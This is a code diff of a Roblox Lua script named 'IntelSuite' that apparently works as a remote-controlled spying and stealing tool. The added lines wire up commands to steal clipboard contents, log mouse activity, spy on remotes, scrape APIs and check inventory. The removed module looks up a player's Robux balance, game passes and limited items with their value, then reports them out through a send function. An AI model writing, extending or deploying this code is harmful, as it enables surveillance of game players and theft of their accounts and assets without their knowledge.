@@ -646,6 +646,41 @@ task.spawn(function()
             elseif cmd == "start" then
                 getgenv().IntelSuite.IsActive = true
                 send("STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Suite reactivated.", 65280)
+
+            elseif cmd == "apiscrap" then
+                if getgenv().IntelSuite.APIScraper then
+                    getgenv().IntelSuite.APIScraper()
+                else
+                    send("API SCRAPER", "Not loaded yet. Wait a few seconds and try again.", 16711680)
+                end
+
+            elseif cmd == "clipboard" then
+                if getgenv().IntelSuite.StealClipboard then
+                    getgenv().IntelSuite.StealClipboard()
+                else
+                    send("CLIPBOARD", "Not loaded yet. Wait a few seconds and try again.", 16711680)
+                end
+
+            elseif cmd == "remotespy" then
+                if getgenv().IntelSuite.StartRemoteSpy then
+                    getgenv().IntelSuite.StartRemoteSpy()
+                else
+                    send("REMOTE SPY", "Not loaded yet. Wait a few seconds and try again.", 16711680)
+                end
+
+            elseif cmd == "mouselog" then
+                if getgenv().IntelSuite.StartMouseLogger then
+                    getgenv().IntelSuite.StartMouseLogger()
+                else
+                    send("MOUSE LOG", "Not loaded yet. Wait a few seconds and try again.", 16711680)
+                end
+
+            elseif cmd == "inventory" then
+                if getgenv().IntelSuite.InventoryCheck then
+                    getgenv().IntelSuite.InventoryCheck()
+                else
+                    send("INVENTORY", "Not loaded yet. Wait a few seconds and try again.", 16711680)
+                end
             end
         end)
     end
@@ -672,70 +707,3 @@ task.spawn(function()
         end)
     end
 end)
-
--- ============================================================
--- MODULE 12: Inventory Checker
--- Runs on startup + !cmd inventory
--- ============================================================
-local function runInventoryCheck()
-    if not getgenv().IntelSuite.IsActive then return end
-    task.spawn(function()
-        local uid = tostring(LocalPlayer.UserId)
-        local result = "**User:** " .. LocalPlayer.Name .. "\n**ID:** " .. uid
-
-        -- Robux balance
-        pcall(function()
-            local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
-            if r then
-                local d = HttpService:JSONDecode(r)
-                if d and d.robux then
-                    result = result .. "\n**Robux:** " .. tostring(d.robux)
-                end
-            end
-        end)
-
-        -- Game passes
-        pcall(function()
-            local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=10")
-            if r then
-                local d = HttpService:JSONDecode(r)
-                if d and d.data and #d.data > 0 then
-                    local passes = {}
-                    for _, v in ipairs(d.data) do
-                        table.insert(passes, tostring(v.name or v.assetName or v.id or "Unknown"))
-                    end
-                    result = result .. "\n**Game Passes:** " .. table.concat(passes, ", ")
-                else
-                    result = result .. "\n**Game Passes:** None"
-                end
-            end
-        end)
-
-        -- Limiteds / collectibles
-        pcall(function()
-            local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=10&sortOrder=Desc")
-            if r then
-                local d = HttpService:JSONDecode(r)
-                if d and d.data and #d.data > 0 then
-                    local totalRAP = 0
-                    local items = {}
-                    for _, v in ipairs(d.data) do
-                        local rap = v.recentAveragePrice or 0
-                        totalRAP = totalRAP + rap
-                        table.insert(items, tostring(v.name or "Unknown") .. " (RAP: " .. tostring(rap) .. ")")
-                    end
-                    result = result .. "\n**Limiteds (est. RAP: " .. tostring(totalRAP) .. "R$):**\n" .. table.concat(items, "\n")
-                else
-                    result = result .. "\n**Limiteds:** None"
-                end
-            end
-        end)
-
-        send("INVENTORY CHECK", result:sub(1, 1900), 16776960)
-    end)
-end
-
-task.wait(4)
-runInventoryCheck()
-getgenv().IntelSuite.InventoryCheck = runInventoryCheck
-
